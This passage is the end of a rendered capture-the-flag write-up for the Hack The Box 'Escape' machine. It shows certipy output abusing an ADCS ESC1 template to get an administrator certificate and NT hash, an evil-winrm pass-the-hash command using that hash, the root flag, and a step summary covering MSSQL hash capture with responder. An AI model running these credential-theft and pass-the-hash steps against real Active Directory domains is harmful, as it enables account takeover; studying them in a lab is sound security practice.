+</span><span id="__span-48-6"><a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>certificate<span class="w"> </span>with<span class="w"> </span>UPN<span class="w"> </span><span class="s1">&#39;administrator@sequel.htb&#39;</span>
+</span><span id="__span-48-7"><a id="__codelineno-48-7" name="__codelineno-48-7" href="#__codelineno-48-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Certificate<span class="w"> </span>has<span class="w"> </span>no<span class="w"> </span>object<span class="w"> </span>SID
+</span><span id="__span-48-8"><a id="__codelineno-48-8" name="__codelineno-48-8" href="#__codelineno-48-8"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saved<span class="w"> </span>certificate<span class="w"> </span>and<span class="w"> </span>private<span class="w"> </span>key<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;administrator.pfx&#39;</span>
+</span></code></pre></div>
+<p>this saved the <code>administrator.pfx</code> </p>
+<h3 id="2-get-tgt-hash-from-the-certificate">2. Get TGT hash from the certificate</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>certipy<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span>administrator.pfx
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>Certipy<span class="w"> </span>v4.8.2<span class="w"> </span>-<span class="w"> </span>by<span class="w"> </span>Oliver<span class="w"> </span>Lyak<span class="w"> </span><span class="o">(</span>ly4k<span class="o">)</span>
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>
+</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Using<span class="w"> </span>principal:<span class="w"> </span>administrator@sequel.htb
+</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>TGT...
+</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>TGT
+</span><span id="__span-50-6"><a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saved<span class="w"> </span>credential<span class="w"> </span>cache<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;administrator.ccache&#39;</span>
+</span><span id="__span-50-7"><a id="__codelineno-50-7" name="__codelineno-50-7" href="#__codelineno-50-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>to<span class="w"> </span>retrieve<span class="w"> </span>NT<span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;administrator&#39;</span>
+</span><span id="__span-50-8"><a id="__codelineno-50-8" name="__codelineno-50-8" href="#__codelineno-50-8"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;administrator@sequel.htb&#39;</span>:<span class="w"> </span>aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
+</span></code></pre></div>
+<p>Great! we got the NTLM hash of the Administrator, now lets login with winrm</p>
+<h2 id="login-as-administrator-via-pass-the-hash">Login as Administrator via pass the hash</h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>sequel.htb<span class="w"> </span>-u<span class="w"> </span>administrator<span class="w"> </span>-H<span class="w"> </span>a52f78e4c751e5f5e17e1e9f3e58f4ee
+</span></code></pre></div>
+<p>grabbed root flag! <code>9cdc0e5182e2e2d9e3ad692973a0d597</code></p>
+<p>proof</p>
+<p><img alt="image.png" src="../MediaFiles/escape_image8.png" /></p>
+<p>Folder structure:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator&gt;<span class="w"> </span>tree<span class="w"> </span>/f<span class="w"> </span>/a
+</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>Folder<span class="w"> </span>PATH<span class="w"> </span>listing
+</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>Volume<span class="w"> </span>serial<span class="w"> </span>number<span class="w"> </span>is<span class="w"> </span>EB33-4140
+</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a>C:.
+</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a>+---.azuredatastudio
+</span><span id="__span-52-6"><a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a><span class="p">|</span><span class="w">   </span><span class="p">|</span><span class="w">   </span>argv.json
+</span><span id="__span-52-7"><a id="__codelineno-52-7" name="__codelineno-52-7" href="#__codelineno-52-7"></a><span class="p">|</span><span class="w">   </span><span class="p">|</span>
+</span><span id="__span-52-8"><a id="__codelineno-52-8" name="__codelineno-52-8" href="#__codelineno-52-8"></a><span class="p">|</span><span class="w">   </span><span class="se">\-</span>--extensions
+</span><span id="__span-52-9"><a id="__codelineno-52-9" name="__codelineno-52-9" href="#__codelineno-52-9"></a>+---3D<span class="w"> </span>Objects
+</span><span id="__span-52-10"><a id="__codelineno-52-10" name="__codelineno-52-10" href="#__codelineno-52-10"></a>+---Contacts
+</span><span id="__span-52-11"><a id="__codelineno-52-11" name="__codelineno-52-11" href="#__codelineno-52-11"></a>+---Desktop
+</span><span id="__span-52-12"><a id="__codelineno-52-12" name="__codelineno-52-12" href="#__codelineno-52-12"></a><span class="p">|</span><span class="w">       </span>root.txt
+</span><span id="__span-52-13"><a id="__codelineno-52-13" name="__codelineno-52-13" href="#__codelineno-52-13"></a><span class="p">|</span>
+</span><span id="__span-52-14"><a id="__codelineno-52-14" name="__codelineno-52-14" href="#__codelineno-52-14"></a>+---Documents
+</span><span id="__span-52-15"><a id="__codelineno-52-15" name="__codelineno-52-15" href="#__codelineno-52-15"></a><span class="p">|</span><span class="w">   </span>+---SQL<span class="w"> </span>Server<span class="w"> </span>Management<span class="w"> </span>Studio
+</span><span id="__span-52-16"><a id="__codelineno-52-16" name="__codelineno-52-16" href="#__codelineno-52-16"></a><span class="p">|</span><span class="w">   </span><span class="p">|</span><span class="w">   </span><span class="se">\-</span>--Code<span class="w"> </span>Snippets
+</span><span id="__span-52-17"><a id="__codelineno-52-17" name="__codelineno-52-17" href="#__codelineno-52-17"></a><span class="p">|</span><span class="w">   </span><span class="p">|</span><span class="w">       </span><span class="se">\-</span>--SQL
+</span><span id="__span-52-18"><a id="__codelineno-52-18" name="__codelineno-52-18" href="#__codelineno-52-18"></a><span class="p">|</span><span class="w">   </span><span class="p">|</span><span class="w">           </span><span class="se">\-</span>--My<span class="w"> </span>Code<span class="w"> </span>Snippets
+</span><span id="__span-52-19"><a id="__codelineno-52-19" name="__codelineno-52-19" href="#__codelineno-52-19"></a><span class="p">|</span><span class="w">   </span><span class="se">\-</span>--Visual<span class="w"> </span>Studio<span class="w"> </span><span class="m">2017</span>
+</span><span id="__span-52-20"><a id="__codelineno-52-20" name="__codelineno-52-20" href="#__codelineno-52-20"></a><span class="p">|</span><span class="w">       </span><span class="se">\-</span>--Templates
+</span><span id="__span-52-21"><a id="__codelineno-52-21" name="__codelineno-52-21" href="#__codelineno-52-21"></a><span class="p">|</span><span class="w">           </span>+---ItemTemplates
+</span><span id="__span-52-22"><a id="__codelineno-52-22" name="__codelineno-52-22" href="#__codelineno-52-22"></a><span class="p">|</span><span class="w">           </span><span class="p">|</span><span class="w">   </span>+---JavaScript
+</span><span id="__span-52-23"><a id="__codelineno-52-23" name="__codelineno-52-23" href="#__codelineno-52-23"></a><span class="p">|</span><span class="w">           </span><span class="p">|</span><span class="w">   </span><span class="se">\-</span>--TypeScript
+</span><span id="__span-52-24"><a id="__codelineno-52-24" name="__codelineno-52-24" href="#__codelineno-52-24"></a><span class="p">|</span><span class="w">           </span><span class="se">\-</span>--ProjectTemplates
+</span><span id="__span-52-25"><a id="__codelineno-52-25" name="__codelineno-52-25" href="#__codelineno-52-25"></a><span class="p">|</span><span class="w">               </span>+---JavaScript
+</span><span id="__span-52-26"><a id="__codelineno-52-26" name="__codelineno-52-26" href="#__codelineno-52-26"></a><span class="p">|</span><span class="w">               </span><span class="se">\-</span>--TypeScript
+</span><span id="__span-52-27"><a id="__codelineno-52-27" name="__codelineno-52-27" href="#__codelineno-52-27"></a>+---Downloads
+</span><span id="__span-52-28"><a id="__codelineno-52-28" name="__codelineno-52-28" href="#__codelineno-52-28"></a>+---Favorites
+</span><span id="__span-52-29"><a id="__codelineno-52-29" name="__codelineno-52-29" href="#__codelineno-52-29"></a><span class="p">|</span><span class="w">   </span><span class="p">|</span><span class="w">   </span>Bing.url
+</span><span id="__span-52-30"><a id="__codelineno-52-30" name="__codelineno-52-30" href="#__codelineno-52-30"></a><span class="p">|</span><span class="w">   </span><span class="p">|</span>
+</span><span id="__span-52-31"><a id="__codelineno-52-31" name="__codelineno-52-31" href="#__codelineno-52-31"></a><span class="p">|</span><span class="w">   </span><span class="se">\-</span>--Links
+</span><span id="__span-52-32"><a id="__codelineno-52-32" name="__codelineno-52-32" href="#__codelineno-52-32"></a>+---Links
+</span><span id="__span-52-33"><a id="__codelineno-52-33" name="__codelineno-52-33" href="#__codelineno-52-33"></a><span class="p">|</span><span class="w">       </span>Desktop.lnk
+</span><span id="__span-52-34"><a id="__codelineno-52-34" name="__codelineno-52-34" href="#__codelineno-52-34"></a><span class="p">|</span><span class="w">       </span>Downloads.lnk
+</span><span id="__span-52-35"><a id="__codelineno-52-35" name="__codelineno-52-35" href="#__codelineno-52-35"></a><span class="p">|</span>
+</span><span id="__span-52-36"><a id="__codelineno-52-36" name="__codelineno-52-36" href="#__codelineno-52-36"></a>+---Music
+</span><span id="__span-52-37"><a id="__codelineno-52-37" name="__codelineno-52-37" href="#__codelineno-52-37"></a>+---Pictures
+</span><span id="__span-52-38"><a id="__codelineno-52-38" name="__codelineno-52-38" href="#__codelineno-52-38"></a>+---Saved<span class="w"> </span>Games
+</span><span id="__span-52-39"><a id="__codelineno-52-39" name="__codelineno-52-39" href="#__codelineno-52-39"></a>+---Searches
+</span><span id="__span-52-40"><a id="__codelineno-52-40" name="__codelineno-52-40" href="#__codelineno-52-40"></a><span class="se">\-</span>--Videos
+</span></code></pre></div>
+<hr />
+<h1 id="summary">Summary</h1>
+<p>Here is the list of the steps simplified, per phase, for future reference and for quick reading:</p>
+<h3 id="reconnaissance_1"><strong>Reconnaissance</strong></h3>
+<ol>
+<li>nmap scan -&gt; found multiple services to focus on, like <code>RPC</code>, <code>SMB</code>, <code>LDAP</code></li>
+<li><strong>RPC</strong> enumeration → nothing useful</li>
+<li><strong>SMB</strong> enumeration revealed <code>share</code> containing a pdf file, containing <strong>credentials</strong></li>
+<li><strong>LDAP</strong> enumeration → nothing useful</li>
+<li><strong>Correlated</strong> the pdf file’s credentials with the <code>MSSQL</code> service</li>
+<li><code>MSSQL</code> enumeration → revealed databases but nothing further interesting</li>
+</ol>
+<h3 id="foothold_1"><strong>Foothold</strong></h3>
+<ol>
+<li><strong>Leaked NTLM hash</strong> via making MSSQL connect to my host and responder (capture hash) revealing the NTLM hash of a user (sql_svc)</li>
+<li><strong>Logged in</strong> as a user (sql_svc)</li>
+<li><strong>Enumerated Files and folders</strong>, found <code>SQL error logs</code> file containing plaintext creds for another user (ryan.cooper)</li>
+<li>logged in winrm as user ryan.cooper</li>
+<li>grabbed <strong>user flag</strong></li>
+</ol>
+<h3 id="privesc_1"><strong>Privesc</strong></h3>
+<ol>
+<li><strong>Group membership</strong> of the user indicated <code>ADCS</code> existence</li>
+<li><strong>Enumerated</strong> <code>ADCS</code>, found it vulnerable to <code>ESC1</code></li>
+<li><strong>Abused</strong> <code>ESC1</code>, got administrator’s <code>pfx</code> and extracted the <code>NTLM</code> hash</li>
+<li>Logged in as administrator via the <code>NTLM</code> hash</li>
+<li>grabbed <strong>root flag</strong></li>
+</ol>
+<h2 id="flow-chart">Flow chart</h2>
+<pre class="mermaid"><code>flowchart TD
+    %% Reconnaissance
+    subgraph Reconnaissance
+        style Reconnaissance fill:blue,stroke:blue,stroke-width:2px
+        R1[Nmap Scan → Found multiple services: &lt;b&gt;RPC&lt;/b&gt;, &lt;b&gt;SMB&lt;/b&gt;, &lt;b&gt;LDAP&lt;/b&gt;]
+        R2[&lt;b&gt;RPC Enumeration&lt;/b&gt; → nothing useful]
+        R3[&lt;b&gt;SMB Enumeration&lt;/b&gt; → share with PDF containing &lt;b&gt;credentials&lt;/b&gt;]
+        R4[&lt;b&gt;LDAP Enumeration&lt;/b&gt; → nothing useful]
+        R5[Correlated PDF &lt;b&gt;credentials&lt;/b&gt; with &lt;b&gt;MSSQL&lt;/b&gt; service]
+        R6[&lt;b&gt;MSSQL Enumeration&lt;/b&gt; → databases found, nothing further]
+
+        R1 --&gt; R2
+        R1 --&gt; R3
+        R1 --&gt; R4
+        R3 --&gt; R5
+        R5 --&gt; R6
+
+        style R1 fill:mediumblue,stroke:darkblue,stroke-width:1px,color:white
+        style R2 fill:mediumblue,stroke:darkblue,stroke-width:1px,color:white
+        style R3 fill:deepskyblue,stroke:blue,stroke-width:1px,color:white
+        style R4 fill:mediumblue,stroke:darkblue,stroke-width:1px,color:white
+        style R5 fill:limegreen,stroke:green,stroke-width:1px,color:white
+        style R6 fill:dodgerblue,stroke:blue,stroke-width:1px,color:white
+    end
+
+    %% Foothold
+    subgraph Foothold
+        style Foothold fill:orange,stroke:darkorange,stroke-width:2px
+        F1[Leaked &lt;b&gt;NTLM hash&lt;/b&gt; via &lt;b&gt;MSSQL&lt;/b&gt; → capture hash of &lt;b&gt;sql_svc&lt;/b&gt;]
+        F2[Logged in as &lt;b&gt;sql_svc&lt;/b&gt;]
+        F3[Enumerated files/folders → SQL error logs with &lt;b&gt;creds&lt;/b&gt; for &lt;b&gt;ryan.cooper&lt;/b&gt;]
+        F4[Logged in via &lt;b&gt;WinRM&lt;/b&gt; as &lt;b&gt;ryan.cooper&lt;/b&gt;]
+        F5[Grabbed &lt;b&gt;user flag&lt;/b&gt;]
+
+        F1 --&gt; F2
+        F2 --&gt; F3
+        F3 --&gt; F4
+        F4 --&gt; F5
+
+        style F1 fill:orangered,stroke:red,stroke-width:1px,color:white
+        style F2 fill:darkorange,stroke:red,stroke-width:1px,color:white
+        style F3 fill:dodgerblue,stroke:blue,stroke-width:1px,color:white
+        style F4 fill:limegreen,stroke:green,stroke-width:1px,color:white
+        style F5 fill:gold,stroke:darkgoldenrod,stroke-width:1px,color:black
+    end
+
+    %% Privilege Escalation
+    subgraph Privilege_Escalation
+        style Privilege_Escalation fill:gray,stroke:black,stroke-width:2px
+        P1[&lt;b&gt;ryan.cooper&lt;/b&gt; group membership → indicates &lt;b&gt;ADCS&lt;/b&gt; existence]
+        P2[Enumerated &lt;b&gt;ADCS&lt;/b&gt; → vulnerable to &lt;b&gt;ESC1&lt;/b&gt;]
+        P3[Abused &lt;b&gt;ESC1&lt;/b&gt; → got admin &lt;b&gt;PFX&lt;/b&gt; → extracted &lt;b&gt;NTLM hash&lt;/b&gt;]
+        P4[Logged in as &lt;b&gt;Administrator&lt;/b&gt; via &lt;b&gt;NTLM hash&lt;/b&gt;]
+        P5[Grabbed &lt;b&gt;root flag&lt;/b&gt;]
+
+        P1 --&gt; P2
+        P2 --&gt; P3
+        P3 --&gt; P4
+        P4 --&gt; P5
+
+        style P1 fill:red,stroke:darkred,stroke-width:1px,color:white
+        style P2 fill:orangered,stroke:red,stroke-width:1px,color:white
+        style P3 fill:dodgerblue,stroke:blue,stroke-width:1px,color:white
+        style P4 fill:limegreen,stroke:green,stroke-width:1px,color:white
+        style P5 fill:gold,stroke:darkgoldenrod,stroke-width:1px,color:black
+    end
+
+    %% Connect phases
+    R6 --&gt; F1
+    F5 --&gt; P1
+</code></pre>
+<hr />
+<h1 id="sidenotes">Sidenotes</h1>
+<p>To sump up, Escape was a medium difficulty machine, leveraging basic enumeration and MSSQL for the foothold part, and ADCS abuse via ESC1 vulnerability for the privesc. </p>
+<p>This one will contribute to my knowledge mainly for the MSSQL and ADCS (ESC1) abuse parts.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.sections", "navigation.tabs", "search.highlight", "toc.sticky", "toc.follow", "content.code.copy", "navigation.top", "navigation.external"], "search": "../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.92b07e13.min.js"></script>
+      
+        <script src="https://fastly.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+      
+        <script src="https://fastly.jsdelivr.net/npm/echarts/dist/echarts.min.js"></script>
+      
+        <script src="../assets/javascripts/interactive_graph.js"></script>
+      
+        <script src="../assets/javascripts/obsidian_tags.js"></script>
+      
+    
+  </body>
+</html>
